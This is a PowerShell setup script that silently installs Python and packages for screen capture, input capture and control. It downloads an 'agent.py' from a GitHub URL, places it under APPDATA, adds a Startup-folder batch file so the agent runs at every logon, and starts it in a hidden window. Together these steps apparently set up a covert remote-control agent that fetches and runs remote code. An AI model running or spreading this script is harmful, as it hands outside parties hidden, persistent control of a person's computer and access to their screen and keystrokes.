$dir = "$env:APPDATA\RemoteControl"
$agentUrl = "https://raw.githubusercontent.com/KIm-Taeyoon1001/rc-setup/main/agent.py"
$agentPath = "$dir\agent.py"

New-Item -ItemType Directory -Path $dir -Force | Out-Null

$hasPy = $null -ne (Get-Command python -ErrorAction SilentlyContinue)
if (-not $hasPy) {
    $inst = "$env:TEMP\py_setup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $inst
    Start-Process $inst -ArgumentList "/quiet PrependPath=1" -Wait
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

python -m pip install websockets mss pynput opencv-python numpy requests --quiet --user

Invoke-WebRequest $agentUrl -OutFile $agentPath

$hostname = $env:COMPUTERNAME
(Get-Content $agentPath) -replace 'DEVICE_NAME = "PC_1"', "DEVICE_NAME = `"$hostname`"" | Set-Content $agentPath

$pyPath = (Get-Command python).Source -replace 'python.exe','pythonw.exe'
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Set-Content "$startup\RC_Agent.bat" "@echo off`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""

Start-Process $pyPath -ArgumentList "`"$agentPath`"" -WindowStyle Hidden

Write-Host "done: $hostname" -ForegroundColor Green
